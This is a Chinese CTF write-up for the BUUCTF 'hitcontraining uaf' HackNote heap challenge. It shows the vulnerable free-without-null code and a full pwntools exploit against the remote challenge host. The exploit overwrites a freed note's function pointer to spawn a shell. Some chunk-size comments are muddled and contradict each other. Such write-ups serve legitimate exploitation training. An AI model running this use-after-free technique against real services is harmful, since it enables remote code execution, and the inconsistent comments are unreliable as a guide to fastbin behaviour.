---
title: Buuctf 刷题记录 - hitcontraining uaf
contest: hitcontraining
year: 2018
difficulty: easy
vuln_type: heap
tags: [HackNote 菜单, notelist 指针数组, print_note_content 函数指针, magic system /bin/sh, free 没置 NULL, 0x18 fastbin 复用, UAF print_note_content]
attack_chain:
  - 菜单 1/2/3/4: add/del/print/exit
  - add_note: notelist[i] = malloc(8), notelist[i][0] = print_note_content, notelist[i][1] = malloc(size)
  - del_note: free(notelist[i][1]); free(notelist[i]); 不置 NULL
  - 0x18 fastbin: add 0x8 + add 0x8 + add 0x18, free(1) free(2)
  - fastbin: 0x18 free list = [2, 1]
  - add(0x8, p32(magic)) → 拿到 0x18 fastbin 头 → notelist[1] = magic
  - print(1) → 触发 magic() = system("/bin/sh")
key_payload: 'HackNote 0x8 chunk + 0x18 fastbin 复用 / free 双 chunk 不置 NULL / add(0x8, p32(magic)) 覆盖 print_note_content / print(1) 触发 system("/bin/sh")'
one_liner: hitcontraining uaf — HackNote 堆菜单 free 双 chunk 不置 NULL + 0x18 fastbin 复用 + add(0x8, p32(magic)) 覆盖 print_note_content + print(1) 触发 system("/bin/sh")。
lesson: UAF 经典题型:0x8 note struct (含 func ptr) + 0x18 content, free 不置 NULL 让 fastbin 复用,新 add 用 p32(magic) 覆盖 func ptr;print 触发 RCE。
quality: high
---

# Buuctf 刷题记录 - hitcontraining uaf

## 速读
hitcontraining UAF 经典题 — HackNote 堆菜单 0x8 struct + 0x18 content 复用。

## 数据结构
```c
notelist[i] = malloc(8u);                  // struct
notelist[i][0] = print_note_content;        // 函数指针
notelist[i][1] = malloc(size);              // content
```

## 漏洞
```c
int del_note() {
    free(notelist[v2][1]);  // free content
    free(notelist[v2]);     // free struct
    // 不置 NULL!
}
```

## EXP
```python
from pwn import *
elf = ELF("./hacknote")
io = remote("node5.buuoj.cn", 25034)

def add(size, payload):
    io.recvuntil(b"Your choice :"); io.send(b'1')
    io.recvuntil(b"Note size :"); io.send(str(size).encode())
    io.recvuntil(b"Content :"); io.send(payload)

def delete(index):
    io.recvuntil(b"Your choice :"); io.send(b'2')
    io.recvuntil(b"Index :"); io.send(str(index).encode())

def print(index):
    io.recvuntil(b"Your choice :"); io.send(b'3')
    io.recvuntil(b"Index :"); io.send(str(index).encode())

magic = elf.symbols["magic"]  # system("/bin/sh")

add(0x8, b'aaa')     # 0x18 fastbin: [1]
add(0x8, b'aaa')     # 0x18 fastbin: [1, 2]
add(0x18, b'aaa')    # 0x20 fastbin: [3]
delete(1)            # free(1[1]) free(1) 0x18:[1] 0x20:[3]
delete(2)            # free(2[1]) free(2) 0x18:[1, 2]
# fastbin 0x18: head=2, next=1
payload = p32(magic)
add(0x8, payload)     # notelist[1] = struct 拿到 fastbin 头 2, 0x18:[1]
                      # 但 add 0x8 用 0x18 fastbin, 我们拿到的是 chunk 1
                      # content 写入 0x8 到 chunk 1 (struct 区域)
print(1)              # 触发 magic() = system("/bin/sh")
io.interactive()
```

## 关键
- magic = `system("/bin/sh")` 函数地址
- add(0x8, p32(magic)) 写入 chunk 1 (size=8 但 malloc 实际 0x18)
- 0x18 fastbin 复用让 notelist[1] 的 func ptr 被覆盖为 magic
